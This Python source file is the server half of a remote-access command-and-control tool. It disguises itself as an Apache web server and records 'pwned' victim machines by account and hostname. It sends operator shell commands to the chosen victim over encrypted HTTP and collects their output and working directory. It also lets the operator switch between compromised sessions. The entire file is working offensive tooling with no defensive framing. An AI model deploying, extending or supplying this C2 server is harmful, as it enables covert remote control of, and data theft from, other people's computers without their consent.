from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from encryption import cipher
from settings import PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR


def get_new_session():
    global active_session, pwned_dict, pwned_id

    del pwned_dict[active_session]

    if not pwned_dict:
        print("Waiting for new connections.\n")
        pwned_id = 0
        active_session = 1
    else:
        while True:
            print(*pwned_dict.items(), sep="\n")
            try:
                new_session = int(input("\nChoose a session number to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
                continue

            if new_session in pwned_dict:
                active_session = new_session
                print(f"\nActive session is now: {pwned_dict[active_session]}")
                break
            else:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_dict, pwned_id

        if self.path.startswith(CMD_REQUEST):

            client = self.path.split(CMD_REQUEST)[1]

            client = cipher.decrypt(client.encode()).decode()

            client_account = client.split('@')[0]

            client_hostname = client.split('@')[1]

            if client not in pwned_dict.values():

                self.http_response(404)

                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            elif client == pwned_dict[active_session]:

                if INPUT_TIMEOUT:

                    try:
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
                                              timeout=INPUT_TIMEOUT)

                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:

                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                try:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(command.encode()))

                except BrokenPipeError:
                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
                    get_new_session()

                if command.startswith("client kill"):
                    get_new_session()

            else:

                self.http_response(404)

    def do_POST(self):
        """ This method handles all HTTP POST requests that arrive at the c2 server. """

        if self.path == RESPONSE:
            print(self.handle_post_data())

        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server.  Why?\n")

    def handle_post_data(self):
        """ Function to handle post data from a client. """

        self.http_response(200)

        content_length = int(self.headers.get("Content-Length"))

        client_data = self.rfile.read(content_length)

        client_data = client_data.decode()

        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

        client_data = unquote_plus(client_data)

        client_data = cipher.decrypt(client_data.encode()).decode()

        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        return


active_session = 1

cwd = "~"

client_account = ""

client_hostname = ""

pwned_id = 0

pwned_dict = {}

server = HTTPServer((BIND_ADDR, PORT), C2Handler)

server.serve_forever()
